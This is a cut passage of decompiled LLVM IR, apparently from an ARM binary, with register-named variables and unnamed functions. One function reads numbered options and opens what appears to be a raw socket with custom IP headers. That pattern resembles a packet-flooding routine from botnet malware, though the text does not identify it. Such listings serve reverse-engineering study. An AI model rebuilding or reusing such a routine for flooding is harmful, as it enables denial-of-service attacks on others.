  %v2_b9f4 = inttoptr i32 %v1_b9f4 to i8*
  %v3_b9f4 = load i8, i8* %v2_b9f4, align 1
  %v4_b9f4 = zext i8 %v3_b9f4 to i32
  store i32 %v1_b9f8, i32* %r3.global-to-local, align 4
  %v1_b9fc = and i32 %v4_b9f4, 251
  %v5_ba00 = or i32 %v1_b9fc, %v4_ba00
  store i32 %v5_ba00, i32* %r2.global-to-local, align 4
  %v1_ba04 = trunc i32 %v5_ba00 to i8
  store i8 %v1_ba04, i8* %v2_b9f4, align 1
  store i32 %v1_b58c, i32* %r1.global-to-local, align 4
  %v0_ba0c = load i32, i32* @sl, align 4
  %v1_ba0c = add i32 %v0_ba0c, 13
  %v2_ba0c = inttoptr i32 %v1_ba0c to i8*
  %v3_ba0c = load i8, i8* %v2_ba0c, align 1
  %v4_ba0c = zext i8 %v3_ba0c to i32
  store i32 %v1_ba10, i32* %r2.global-to-local, align 4
  %v1_ba14 = and i32 %v4_ba0c, 253
  %v4_ba18 = or i32 %v1_ba14, %v3_ba18
  store i32 %v4_ba18, i32* %r3.global-to-local, align 4
  %v1_ba1c = trunc i32 %v4_ba18 to i8
  store i8 %v1_ba1c, i8* %v2_ba0c, align 1
  %v0_ba24 = load i32, i32* @sl, align 4
  %v1_ba24 = add i32 %v0_ba24, 13
  %v2_ba24 = inttoptr i32 %v1_ba24 to i8*
  %v3_ba24 = load i8, i8* %v2_ba24, align 1
  %v4_ba24 = zext i8 %v3_ba24 to i32
  %v1_ba2c = and i32 %v4_ba24, 254
  store i32 %v1_ba2c, i32* %r2.global-to-local, align 4
  %v2_ba30 = or i32 %v1_ba2c, %v1_ba28
  store i32 %v2_ba30, i32* %r3.global-to-local, align 4
  %v1_ba34 = trunc i32 %v2_ba30 to i8
  store i8 %v1_ba34, i8* %v2_ba24, align 1
  %v3_ba38 = load i32, i32* @sl, align 4
  %v4_ba38 = add i32 %v3_ba38, 14
  %v5_ba38 = inttoptr i32 %v4_ba38 to i16*
  store i16 %v1_b9a4, i16* %v5_ba38, align 2
  store i32 %v6_b5c4, i32* %r1.global-to-local, align 4
  %v0_ba40 = load i32, i32* @r4, align 4
  %v1_ba40 = add i32 %v0_ba40, 40
  store i32 %v1_ba40, i32* %r0.global-to-local, align 4
  %v2_ba44 = inttoptr i32 %v1_ba40 to i16*
  %v3_ba44 = call i32 @function_f770(i16* %v2_ba44, i32 %v6_b5c4)
  store i32 %v3_ba44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b7c4

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_b630
  store i32 %v6_b5c4, i32* %r2.global-to-local, align 4
  %.pre = add i32 %v6_b5c4, 40
  br label %dec_label_pc_ba5c

dec_label_pc_ba5c:                                ; preds = %dec_label_pc_b7d8, %dec_label_pc_ba4c
  %storemerge7.pre-phi = phi i32 [ %v1_b8a4, %dec_label_pc_b7d8 ], [ %.pre, %dec_label_pc_ba4c ]
  %v0_ba6823 = phi i32 [ %v0_b7cc, %dec_label_pc_b7d8 ], [ 0, %dec_label_pc_ba4c ]
  store i32 %storemerge7.pre-phi, i32* @r7, align 4
  %storemerge5 = mul i32 %v6_b5c4, 65536
  %storemerge = add i32 %v6_b5c4, 20
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v1_ba5c = add i32 %storemerge5, 1310720
  store i32 %v1_ba5c, i32* %r3.global-to-local, align 4
  %v3_ba60 = udiv i32 %v1_ba5c, 65536
  store i32 %v3_ba60, i32* @sl, align 4
  %v2_bb98 = icmp eq i32 %v1_b5e4, 0
  %v3_ba8c = icmp eq i32 %v3_b638, 65535
  br label %dec_label_pc_ba64

dec_label_pc_ba64:                                ; preds = %dec_label_pc_ba64, %dec_label_pc_bb7c, %dec_label_pc_ba5c
  %v0_ba68 = phi i32 [ %v0_ba6823, %dec_label_pc_ba5c ], [ 0, %dec_label_pc_bb7c ], [ 0, %dec_label_pc_ba64 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ba68 = icmp eq i32 %v0_ba68, 0
  store i1 %v2_ba68, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ba68, label %dec_label_pc_ba64, label %dec_label_pc_ba74

dec_label_pc_ba74:                                ; preds = %dec_label_pc_ba64, %dec_label_pc_bb7c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ba78

dec_label_pc_ba78:                                ; preds = %dec_label_pc_baa4, %dec_label_pc_ba74
  %v1_ba84 = phi i32 [ %v1_bb6c, %dec_label_pc_baa4 ], [ 0, %dec_label_pc_ba74 ]
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_b638, i32* %r1.global-to-local, align 4
  %v4_ba84 = mul i32 %v1_ba84, 4
  %v5_ba84 = add i32 %v4_ba84, %v2_b44c
  %v6_ba84 = inttoptr i32 %v5_ba84 to i32*
  %v7_ba84 = load i32, i32* %v6_ba84, align 4
  store i32 %v7_ba84, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_ba8c, i1* %cpsr_z.global-to-local, align 1
  %v1_ba90 = add i32 %v7_ba84, 20
  store i32 %v1_ba90, i32* @r5, align 4
  br i1 %v3_ba8c, label %dec_label_pc_bb90, label %dec_label_pc_ba98

dec_label_pc_ba98:                                ; preds = %dec_label_pc_ba78
  store i32 %v1_b5e4, i32* %r2.global-to-local, align 4
  store i1 %v2_bb98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bb98, label %dec_label_pc_baa4, label %dec_label_pc_bba4

dec_label_pc_baa4:                                ; preds = %dec_label_pc_ba98, %dec_label_pc_bb90, %dec_label_pc_bba4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_baa8 = load i32, i32* @r4, align 4
  %v3_baa8 = add i32 %v2_baa8, 10
  %v4_baa8 = inttoptr i32 %v3_baa8 to i16*
  store i16 0, i16* %v4_baa8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bab0 = load i32, i32* @r4, align 4
  store i32 %v0_bab0, i32* @r0, align 4
  %v2_bab4 = call i32 @function_dadc(i32 %v0_bab0, i32 20)
  %v3_bab4 = trunc i32 %v2_bab4 to i16
  store i32 %v2_bab4, i32* %r0.global-to-local, align 4
  %v3_bab8 = load i32, i32* %stack_var_-44, align 4
  %v3_babc = mul i32 %v3_bab8, 16
  %v1_bac0 = load i32, i32* @r8, align 4
  %v2_bac0 = add i32 %v1_bac0, %v3_babc
  store i32 %v2_bac0, i32* %r2.global-to-local, align 4
  %v1_bac4 = add i32 %v2_bac0, 4
  %v2_bac4 = inttoptr i32 %v1_bac4 to i32*
  %v3_bac4 = load i32, i32* %v2_bac4, align 4
  %v3_bac8 = mul i32 %v3_bac4, 65536
  store i32 %v3_bac8, i32* %r1.global-to-local, align 4
  %v1_bacc = add i32 %v3_bac4, 1
  store i32 %v1_bacc, i32* %r3.global-to-local, align 4
  store i32 %v1_bacc, i32* %v2_bac4, align 4
  %v3_bad4 = load i32, i32* @r4, align 4
  %v4_bad4 = add i32 %v3_bad4, 10
  %v5_bad4 = inttoptr i32 %v4_bad4 to i16*
  store i16 %v3_bab4, i16* %v5_bad4, align 2
  %v0_bad8 = load i32, i32* %r1.global-to-local, align 4
  %v3_bad8 = udiv i32 %v0_bad8, 65536
  store i32 %v3_bad8, i32* %r0.global-to-local, align 4
  %v1_badc = call i32 @function_14898(i32 %v3_bad8)
  store i32 %v1_badc, i32* %r0.global-to-local, align 4
  %v1_bae0 = load i32, i32* @r5, align 4
  %v2_bae0 = add i32 %v1_bae0, 4
  %v3_bae0 = inttoptr i32 %v2_bae0 to i32*
  store i32 %v1_badc, i32* %v3_bae0, align 4
  %v3_bae4 = load i32, i32* %stack_var_-44, align 4
  %v3_bae8 = mul i32 %v3_bae4, 16
  %v1_baec = load i32, i32* @r8, align 4
  %v2_baec = add i32 %v1_baec, %v3_bae8
  store i32 %v2_baec, i32* %r3.global-to-local, align 4
  %v1_baf0 = add i32 %v2_baec, 8
  %v2_baf0 = inttoptr i32 %v1_baf0 to i32*
  %v3_baf0 = load i32, i32* %v2_baf0, align 4
  %v3_baf8 = urem i32 %v3_baf0, 65536
  store i32 %v3_baf8, i32* %r0.global-to-local, align 4
  %v1_bafc = call i32 @function_14898(i32 %v3_baf8)
  %v2_bb04 = load i32, i32* @r5, align 4
  %v3_bb04 = add i32 %v2_bb04, 16
  %v4_bb04 = inttoptr i32 %v3_bb04 to i16*
  store i16 0, i16* %v4_bb04, align 2
  %v1_bb08 = load i32, i32* @r5, align 4
  %v2_bb08 = add i32 %v1_bb08, 8
  %v3_bb08 = inttoptr i32 %v2_bb08 to i32*
  store i32 %v1_bafc, i32* %v3_bb08, align 4
  %v0_bb0c = load i32, i32* @sl, align 4
  store i32 %v0_bb0c, i32* %r0.global-to-local, align 4
  %v1_bb10 = call i32 @function_14898(i32 %v0_bb0c)
  %v0_bb14 = load i32, i32* @r5, align 4
  store i32 %v0_bb14, i32* @r1, align 4
  store i32 %v1_bb10, i32* %r2.global-to-local, align 4
  %v0_bb1c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_bb1c, i32* %r3.global-to-local, align 4
  %v0_bb20 = load i32, i32* @r4, align 4
  store i32 %v0_bb20, i32* %r0.global-to-local, align 4
  %v4_bb24 = call i32 @function_db2c(i32 %v0_bb20, i32 %v0_bb14, i32 %v1_bb10, i32 %v0_bb1c)
  %v5_bb24 = trunc i32 %v4_bb24 to i16
  store i32 %v4_bb24, i32* %r0.global-to-local, align 4
  %v3_bb28 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bb28, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v3_bb30 = mul i32 %v3_bb28, 32
  store i32 %v3_bb30, i32* %lr.global-to-local, align 4
  %v3_bb34 = load i32, i32* @r5, align 4
  %v4_bb34 = add i32 %v3_bb34, 16
  %v5_bb34 = inttoptr i32 %v4_bb34 to i16*
  store i16 %v5_bb24, i16* %v5_bb34, align 2
  %v0_bb38 = load i32, i32* %lr.global-to-local, align 4
  %v1_bb38 = load i32, i32* %r3.global-to-local, align 4
  %tmp95 = mul i32 %v1_bb38, -8
  %v5_bb38 = add i32 %v0_bb38, %tmp95
  store i32 %v5_bb38, i32* %lr.global-to-local, align 4
  %v0_bb3c = load i32, i32* @r5, align 4
  %v1_bb3c = add i32 %v0_bb3c, 2
  %v2_bb3c = inttoptr i32 %v1_bb3c to i16*
  %v3_bb3c = load i16, i16* %v2_bb3c, align 2
  %v4_bb3c = zext i16 %v3_bb3c to i32
  store i32 %v4_bb3c, i32* %r5.global-to-local, align 4
  %v1_bb40 = load i32, i32* %r1.global-to-local, align 4
  %v2_bb40 = add i32 %v1_bb40, %v5_bb38
  store i32 %v2_bb40, i32* @lr, align 4
  %v3_bb44 = add i32 %v2_bb40, 2
  %v4_bb44 = inttoptr i32 %v3_bb44 to i16*
  store i16 %v3_bb3c, i16* %v4_bb44, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_bb50 = load i32, i32* @r4, align 4
  store i32 %v0_bb50, i32* @r1, align 4
  %v0_bb54 = load i32, i32* @fp, align 4
  store i32 %v0_bb54, i32* @r0, align 4
  %v0_bb58 = load i32, i32* @r7, align 4
  store i32 %v0_bb58, i32* @r2, align 4
  %v0_bb64 = call i32 @function_14ae4()
  %v3_bb68 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bb68, i32* %r3.global-to-local, align 4
  %v1_bb6c = add i32 %v3_bb68, 1
  store i32 %v1_bb6c, i32* %r0.global-to-local, align 4
  %v0_bb70 = load i32, i32* @r6, align 4
  %v9_bb70 = icmp eq i32 %v0_bb70, %v1_bb6c
  store i1 %v9_bb70, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bb6c, i32* %stack_var_-44, align 4
  %v8_bb78 = icmp sgt i32 %v0_bb70, %v1_bb6c
  br i1 %v8_bb78, label %dec_label_pc_ba78, label %dec_label_pc_bb7c

dec_label_pc_bb7c:                                ; preds = %dec_label_pc_baa4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bb80 = icmp eq i32 %v0_bb70, 0
  store i1 %v2_bb80, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bb80, label %dec_label_pc_ba64, label %dec_label_pc_ba74

dec_label_pc_bb90:                                ; preds = %dec_label_pc_ba78
  %v0_bb90 = call i32 @function_f570()
  %v1_bb90 = trunc i32 %v0_bb90 to i16
  store i32 %v0_bb90, i32* %r0.global-to-local, align 4
  store i32 %v1_b5e4, i32* %r2.global-to-local, align 4
  store i1 %v2_bb98, i1* %cpsr_z.global-to-local, align 1
  %v3_bb9c = load i32, i32* @r4, align 4
  %v4_bb9c = add i32 %v3_bb9c, 4
  %v5_bb9c = inttoptr i32 %v4_bb9c to i16*
  store i16 %v1_bb90, i16* %v5_bb9c, align 2
  br i1 %v2_bb98, label %dec_label_pc_baa4, label %dec_label_pc_bb90.dec_label_pc_bba4_crit_edge

dec_label_pc_bb90.dec_label_pc_bba4_crit_edge:    ; preds = %dec_label_pc_bb90
  %v0_bba4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bba4

dec_label_pc_bba4:                                ; preds = %dec_label_pc_bb90.dec_label_pc_bba4_crit_edge, %dec_label_pc_ba98
  %v0_bba4 = phi i32 [ %v0_bba4.pre, %dec_label_pc_bb90.dec_label_pc_bba4_crit_edge ], [ %v7_ba84, %dec_label_pc_ba98 ]
  %v1_bba4 = add i32 %v0_bba4, 40
  store i32 %v1_bba4, i32* %r0.global-to-local, align 4
  store i32 %v6_b5c4, i32* %r1.global-to-local, align 4
  %v2_bbac = inttoptr i32 %v1_bba4 to i16*
  %v3_bbac = call i32 @function_f770(i16* %v2_bbac, i32 %v6_b5c4)
  store i32 %v3_bbac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_baa4

; uselistorder directives
  uselistorder i32 %v0_bb90, { 1, 0 }
  uselistorder i32 %v1_bb6c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_bb38, { 1, 0 }
  uselistorder i32 %v4_bb24, { 1, 0 }
  uselistorder i32 %v3_baf8, { 1, 0 }
  uselistorder i32 %v3_bad8, { 1, 0 }
  uselistorder i32 %v3_bac4, { 1, 0 }
  uselistorder i32 %v2_bab4, { 1, 0 }
  uselistorder i1 %v3_ba8c, { 1, 0 }
  uselistorder i1 %v2_bb98, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b9a4, { 1, 0 }
  uselistorder i32 %v1_b92c, { 1, 0 }
  uselistorder i32 %v1_b908, { 1, 0 }
  uselistorder i32 %v3_b8f8, { 1, 0 }
  uselistorder i32 %v0_b848, { 1, 0 }
  uselistorder i32 %v1_b82c, { 1, 2, 0 }
  uselistorder i32 %v1_b7c8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_b7b4, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_b740, { 1, 0 }
  uselistorder i32 %v0_b738, { 0, 2, 1, 3 }
  uselistorder i1 %v9_b768, { 1, 0 }
  uselistorder i32 %v4_b77c, { 1, 0 }
  uselistorder i32 %v0_b85c, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v1_b6d4, { 1, 0 }
  uselistorder i32 %v4_b6b4, { 1, 0 }
  uselistorder i1 %v7_b6ac, { 1, 0, 2 }
  uselistorder i1 %v7_b660, { 1, 0 }
  uselistorder i32 %v3_b65c, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i32 %v1_ba10, { 1, 0 }
  uselistorder i32 %v1_b9f8, { 1, 0 }
  uselistorder i32 %v1_b9e0, { 1, 0 }
  uselistorder i32 %v1_b9c8, { 1, 0 }
  uselistorder i32 %v1_b9b0, { 1, 0 }
  uselistorder i32 %v3_b774, { 0, 2, 1 }
  uselistorder i1 %v2_b790, { 1, 0 }
  uselistorder i32 %v1_b78c, { 1, 0 }
  uselistorder i32 %v4_b788, { 2, 0, 1 }
  uselistorder i1 %v3_b83c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_b694, { 1, 0, 2 }
  uselistorder i32 %v3_b638, { 3, 4, 2, 1, 0 }
  uselistorder i1 %v7_b628, { 1, 0 }
  uselistorder i1 %v7_b5fc, { 1, 0 }
  uselistorder i32 %v3_b5f8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_b5e4, { 2, 3, 1, 0 }
  uselistorder i32 %v6_b5c4, { 8, 7, 2, 0, 1, 9, 5, 4, 6, 3 }
  uselistorder i32 %v3_b4ec, { 1, 3, 2, 0, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 46, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 43, 45, 44, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 7, 8, 10, 9, 12, 11, 14, 13, 15, 17, 16, 19, 18, 20, 21, 22, 23, 25, 24, 27, 26, 28, 30, 29, 31, 33, 32, 34, 35, 36, 38, 37, 39, 41, 40, 43, 42, 45, 44, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 24, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 2, 1, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_baa4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ba74, { 1, 0 }
  uselistorder label %dec_label_pc_ba64, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ba5c, { 1, 0 }
  uselistorder label %dec_label_pc_b934, { 1, 0 }
  uselistorder label %dec_label_pc_b7f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b7c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b700, { 2, 1, 3, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_b66c, { 1, 0 }
}

define i32 @function_bbb8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_bbb8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_bbb8 = load i32, i32* @r4, align 4
  %v18_bbb8 = load i32, i32* @sb, align 4
  %v24_bbb8 = load i32, i32* @fp, align 4
  %v27_bbb8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_bbd4 = call i32 @function_13258(i32 %arg1, i32 4)
  %v0_bbd8 = load i32, i32* @r5, align 4
  store i32 %v0_bbd8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bbe8 = load i32, i32* @r4, align 4
  %v5_bbec = inttoptr i32 %v0_bbd8 to i32*
  %v6_bbec = call i32 @function_a430(i32 %v0_bbe8, i32* %v5_bbec, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bc04 = load i32, i32* @r5, align 4
  store i32 %v0_bc04, i32* %r1.global-to-local, align 4
  %v0_bc08 = load i32, i32* @r4, align 4
  %v5_bc0c = trunc i32 %v6_bbec to i8
  %v6_bc10 = inttoptr i32 %v0_bc04 to i32*
  %v7_bc10 = call i32 @function_a430(i32 %v0_bc08, i32* %v6_bc10, i32 3, i32 65535)
  %v0_bc14 = load i32, i32* @r5, align 4
  store i32 %v0_bc14, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_bc24 = load i32, i32* @r4, align 4
  %v5_bc28 = inttoptr i32 %v0_bc14 to i32*
  %v6_bc28 = call i32 @function_a430(i32 %v0_bc24, i32* %v5_bc28, i32 4, i32 64)
  %v0_bc34 = load i32, i32* @r5, align 4
  store i32 %v0_bc34, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc40 = load i32, i32* @r4, align 4
  %v6_bc48 = inttoptr i32 %v0_bc34 to i32*
  %v7_bc48 = call i32 @function_a430(i32 %v0_bc40, i32* %v6_bc48, i32 5, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bc5c = load i32, i32* @r5, align 4
  store i32 %v0_bc5c, i32* %r1.global-to-local, align 4
  %v0_bc60 = load i32, i32* @r4, align 4
  %v1_bc64 = urem i32 %v7_bc48, 256
  store i32 %v1_bc64, i32* @fp, align 4
  %v4_bc68 = inttoptr i32 %v0_bc5c to i32*
  %v5_bc68 = call i32 @function_a430(i32 %v0_bc60, i32* %v4_bc68, i32 6, i32 65535)
  %v0_bc70 = load i32, i32* @r5, align 4
  store i32 %v0_bc70, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v5_bc68, i32* @sl, align 4
  %v0_bc80 = load i32, i32* @r4, align 4
  %v4_bc84 = inttoptr i32 %v0_bc70 to i32*
  %v5_bc84 = call i32 @function_a430(i32 %v0_bc80, i32* %v4_bc84, i32 7, i32 65535)
  %v0_bc8c = load i32, i32* @r5, align 4
  store i32 %v0_bc8c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_bc84, i32* @r6, align 4
  %v0_bc9c = load i32, i32* @r4, align 4
  %v4_bca0 = inttoptr i32 %v0_bc8c to i32*
  %v5_bca0 = call i32 @function_a430(i32 %v0_bc9c, i32* %v4_bca0, i32 17, i32 65535)
  %v0_bcac = load i32, i32* @r5, align 4
  store i32 %v0_bcac, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_bcb8 = load i32, i32* @r4, align 4
  %v5_bcbc = inttoptr i32 %v0_bcac to i32*
  %v6_bcbc = call i32 @function_a430(i32 %v0_bcb8, i32* %v5_bcbc, i32 18, i32 65535)
  %v0_bcc0 = load i32, i32* @r5, align 4
  store i32 %v0_bcc0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bcd0 = load i32, i32* @r4, align 4
  %v5_bcd4 = inttoptr i32 %v0_bcc0 to i32*
  %v6_bcd4 = call i32 @function_a430(i32 %v0_bcd0, i32* %v5_bcd4, i32 11, i32 0)
  %v0_bcd8 = load i32, i32* @r5, align 4
  store i32 %v0_bcd8, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bce8 = load i32, i32* @r4, align 4
  %v5_bcec = inttoptr i32 %v0_bcd8 to i32*
  %v6_bcec = call i32 @function_a430(i32 %v0_bce8, i32* %v5_bcec, i32 12, i32 1)
  %v0_bcf0 = load i32, i32* @r5, align 4
  store i32 %v0_bcf0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bd00 = load i32, i32* @r4, align 4
  %v5_bd04 = inttoptr i32 %v0_bcf0 to i32*
  %v6_bd04 = call i32 @function_a430(i32 %v0_bd00, i32* %v5_bd04, i32 13, i32 0)
  %v0_bd08 = load i32, i32* @r5, align 4
  store i32 %v0_bd08, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bd18 = load i32, i32* @r4, align 4
  %v5_bd1c = inttoptr i32 %v0_bd08 to i32*
  %v6_bd1c = call i32 @function_a430(i32 %v0_bd18, i32* %v5_bd1c, i32 14, i32 0)
  %v0_bd20 = load i32, i32* @r5, align 4
  store i32 %v0_bd20, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bd30 = load i32, i32* @r4, align 4
  %v5_bd34 = inttoptr i32 %v0_bd20 to i32*
  %v6_bd34 = call i32 @function_a430(i32 %v0_bd30, i32* %v5_bd34, i32 15, i32 0)
  %v0_bd38 = load i32, i32* @r5, align 4
  store i32 %v0_bd38, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bd48 = load i32, i32* @r4, align 4
  %v5_bd4c = inttoptr i32 %v0_bd38 to i32*
  %v6_bd4c = call i32 @function_a430(i32 %v0_bd48, i32* %v5_bd4c, i32 16, i32 0)
  %v0_bd50 = load i32, i32* @r5, align 4
  store i32 %v0_bd50, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_bd4c, i32* @sb, align 4
  %v0_bd60 = load i32, i32* @r4, align 4
  %v4_bd64 = inttoptr i32 %v0_bd50 to i32*
  %v5_bd64 = call i32 @function_a430(i32 %v0_bd60, i32* %v4_bd64, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bd74 = load i32, i32* @r5, align 4
  store i32 %v0_bd74, i32* %r1.global-to-local, align 4
  %v0_bd78 = load i32, i32* @r4, align 4
  %v4_bd7c = inttoptr i32 %v0_bd74 to i32*
  %v5_bd7c = call i32 @function_a430(i32 %v0_bd78, i32* %v4_bd7c, i32 1, i32 1)
  %v2_bd88 = load i32, i32* @global_var_2295c.90, align 4
  store i32 %v2_bd88, i32* %r3.global-to-local, align 4
  %v1_bd8c = urem i32 %v5_bd7c, 256
  %v0_bd90 = load i32, i32* @r5, align 4
  store i32 %v0_bd90, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_bd98 = load i32, i32* @r4, align 4
  %v5_bda0 = inttoptr i32 %v0_bd90 to i32*
  %v6_bda0 = call i32 @function_a3c4(i32 %v0_bd98, i32* %v5_bda0, i32 25, i32 %v2_bd88, i32 %v1_bd8c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_bdb4 = call i32 @function_14ba0(i32 2, i32 3, i32 6)
  store i32 %v3_bdb4, i32* @r0, align 4
  %v7_bdb8 = icmp eq i32 %v3_bdb4, -1
  store i1 %v7_bdb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bdb8, label %dec_label_pc_c02c, label %dec_label_pc_bdc4

dec_label_pc_bdc4:                                ; preds = %dec_label_pc_bbb8
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bdcc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bdcc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v5_bde0 = call i32 @function_14b30(i32 %v3_bdb4, i32 0, i32 3, i32 %v6_bdcc, i32 4)
  %v7_bde4 = icmp eq i32 %v5_bde0, -1
  store i1 %v7_bde4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bde4, label %dec_label_pc_c024, label %dec_label_pc_bdec

dec_label_pc_bdec:                                ; preds = %dec_label_pc_bdc4
  %v0_bdf0 = load i32, i32* @sl, align 4
  %v0_bdf8 = load i32, i32* @r6, align 4
  %v3_be00 = urem i32 %v7_bc10, 65536
  store i32 %v3_be00, i32* %r3.global-to-local, align 4
  %v3_be04 = urem i32 %v0_bdf0, 65536
  store i32 %v3_be04, i32* %r2.global-to-local, align 4
  %v3_be08 = urem i32 %v0_bdf8, 65536
